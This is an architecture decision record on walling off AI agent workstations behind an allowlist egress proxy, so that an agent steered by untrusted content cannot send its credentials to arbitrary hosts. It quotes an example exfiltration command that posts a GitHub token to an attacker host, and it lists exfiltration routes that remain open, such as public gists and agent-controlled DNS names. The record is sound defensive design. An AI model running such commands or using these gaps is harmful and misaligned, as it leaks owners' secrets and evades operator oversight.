# ADR-0028: Workstation egress runs through an allowlist proxy

Date: 2026-09-20 · Status: accepted · Amends: ADR-0017 (decision 9, "open egress") · Amended 2026-09-20 (decision 3: the hub entry is the MCP listener, #238)

## Context

ADR-0017 gave every workstation full outbound network and recorded the
consequence honestly: injected secrets are readable by the loop, so a loop
steered by untrusted content it reads can `curl -d "$GH_TOKEN" https://attacker`
and the value leaves. Containment stops code from escaping the wall, not the
agent from handing out a credential it legitimately holds.

The structural fix is the credential broker (#30, L4): the agent wields a
capability and never sees the value. The operator decided on 2026-09-19 that L1
closes without it — with output redaction (#150, shipped) and this: cutting the
path from the workstation to arbitrary hosts, at the network layer rather than
by asking the agent nicely (#193).

## Decision

1. **Workstations live on an internal network and reach the world only through
   a proxy.** A single docker network `spool-egress` created `--internal` — the
   daemon installs no route off it — carries every docker workstation. One
   shared proxy container, `spool-egress-proxy`, sits on both that network and
   the default bridge and is the only thing that can forward outward. Both are
   named after the proxy image, so a hub configured with a different one (the
   tier-2 suite's, say) builds its own wall instead of joining a running
   fleet's.
   `--internal` is the enforcement: it is the daemon's own rule, not a
   convention a loop can opt out of, and a process inside the workstation
   cannot reach an address the network has no route to no matter what it runs.

2. **The proxy is ours, in Go, stdlib-only.** `cmd/spool-egress` is an ordinary
   forward proxy: `CONNECT host:port` for TLS, absolute-form requests for plain
   HTTP. It matches the requested host name *and port* against the allowlist
   *before* dialing and refuses everything else with `403` and a body naming the host,
   so a blocked call fails fast and legibly inside the turn instead of hanging.
   Squid or tinyproxy would do the same job; a ~200-line stdlib proxy avoids a
   new dependency, a config dialect, and an image we do not control, and it
   lets the allowlist be a Go value the tier-2 suite can drive directly.
   The image is `FROM scratch` plus the static binary.

3. **The hub is reached through the proxy too, and only its loop-facing
   listener is.** An internal network has no
   route to the host gateway either, so `host.docker.internal` moves from the
   workstation to the proxy container (`--add-host …:host-gateway`) and a
   loop's MCP traffic is proxied like anything else. The gateway is the one
   entry that is *not* compiled in: it is the operator's own machine, so the
   runtime allowlists it on one port alone — `--mcp-listen`, which serves the
   MCP endpoint and nothing else. The operator's API and control room are on
   `--listen`, which is on no allowlist and therefore not a destination a
   workstation has at all. Allowlisting the API port instead would have handed
   every loop the unauthenticated admin API (#238): its own conversations,
   every other owner's, the fleet's settings, and the creation of a *bare*
   loop that runs outside any container. That separation is at the network
   layer on purpose — it holds whether or not the API's own authentication is
   right, and it held before the API had any. A proxy whose configuration
   has changed — a moved hub, a new image — is replaced rather than kept,
   since run arguments are fixed at creation. `HTTP_PROXY`, `HTTPS_PROXY` and their lowercase twins are set in every
   exec env, with `NO_PROXY=localhost,127.0.0.1` so a loop's own local servers
   stay direct. `claude`, `gh`, `git`, `go`, `npm` and Go's own HTTP client all
   honour them — which is what makes a *forward* proxy the cheap shape here.

   **Amended by ADR-0030:** the operator listener now carries a credential of
   its own. This decision remains the reason a workstation cannot reach it at
   all; that one covers the callers the network cannot tell apart.

4. **The allowlist is a default fleet-wide list, extendable per loop later.**
   The default is what a loop needs to do its job: Anthropic's API and Claude
   Code's install/update hosts, GitHub (api/web/objects/codeload), the Go module
   proxy and checksum database, the npm registry, Debian's archives for the
   image's own package manager, and the hub. It is a Go value in
   `internal/egress`, linked into the proxy binary, so adding a host is a PR
   with a reason rather than a config file nobody reviews; `--egress-allow`
   extends it for one fleet without a rebuild. An entry is a host, optionally
   with one port; without a port it permits 80 and 443 only, so an allowlisted
   host is a web destination and not a tunnel to every port it happens to
   listen on. Per-loop extension —
   a loop that must read the web is granted it explicitly — is the same
   decision keyed on the requesting workstation's address, and lands separately
   (#193 follow-up); nothing here needs to change shape for it.

5. **Lifecycle matches the workstation's.** The network and the proxy are
   ensured idempotently before a workstation is provisioned, and the proxy runs
   `--restart unless-stopped`, so both survive daemon and orchestrator
   restarts. Neither is torn down with a loop: they are fleet infrastructure,
   and `docker network rm` on a network with members would fail anyway.

6. **The bare runtime is explicitly outside this.** A bare loop is a host
   process with the host's network; there is no wall to put a door in. The docs
   already badge it *uncontained* and this is one more thing that badge means.

## Consequences

- The L1 exit criterion grows a clause: a workstation cannot exfiltrate what it
  holds to arbitrary hosts. A stolen token still has to leave through a host on
  the allowlist — GitHub is on it, so a loop *can* still write a secret into a
  public gist. Redaction (#150) and least-privilege scoping remain load-bearing;
  the broker (#30) is still the structural fix.
- **Matching is on the requested name, not the resolved address.** A name the
  agent controls that resolves wherever it likes is not stopped by this; DNS and
  TLS-inspecting filtering were out of scope by decision. The allowlist is a
  list of hosts we trust *as destinations*, which is exactly as strong as the
  weakest of them.
- Existing workstations keep their old network until they are recreated: the
  network is fixed at `docker run`. The control room's recreate control
  (ADR-0021) is the migration path, and a workstation still on the bridge is
  simply in the pre-#193 posture.
- A loop that needs a host nobody anticipated now fails instead of silently
  succeeding, and the operator has to add it. That cost is the point, but it
  means the default list is a thing we maintain — measured, not guessed, and
  changed by PR.
- **Only what honours proxy variables gets out.** `git` over SSH does not: a
  loop must clone and push over HTTPS with its gh credential, which is what the
  workstation image and ADR-0017's "loops clone themselves" already assume, and
  anything raw-socket is cut with it. What a proxy *can* carry is `CONNECT` to
  any port, which is why the allowlist names ports: an entry without one
  permits 80 and 443, and the gateway permits the hub's port and nothing else.
  A loop therefore has no tunnel to ssh or a database on the operator's own
  machine — the reach a workstation on the bridge did have.
- **Name resolution is not a way out either.** Docker's embedded resolver on an
  `--internal` network answers for containers on that network and nothing else:
  measured on the fleet's daemon, a container there resolves the proxy by name
  and `getent hosts example.com` fails, while the same image on the bridge
  resolves it. So the low-bandwidth channel of encoding data in DNS labels is
  closed by the same wall, not left open beside it.
- One more long-lived container per fleet (not per loop): a scratch-image Go
  process, idle between requests, well inside the QUALITY.md envelope.
- **The operator now binds two ports.** With docker workstations `--mcp-listen`
  must name an address the bridge can reach, which was previously true of the
  single listener and so exposed the API with it; now the address the bridge
  can reach carries one endpoint whose only caller is a loop holding that
  loop's own bearer token. The hub refuses to start if the two listeners would
  be the same socket, since that silently restores the old hole, and it warns
  at boot when the default runtime is docker and `--mcp-listen` is on loopback
  — a fleet whose one allowed destination is the one it cannot route to comes
  up looking healthy and never wakes.
- Proxy denials are logged by host, never by URL: a query string can carry a
  credential, and this log is the one place a blocked exfiltration attempt is
  visible at all.
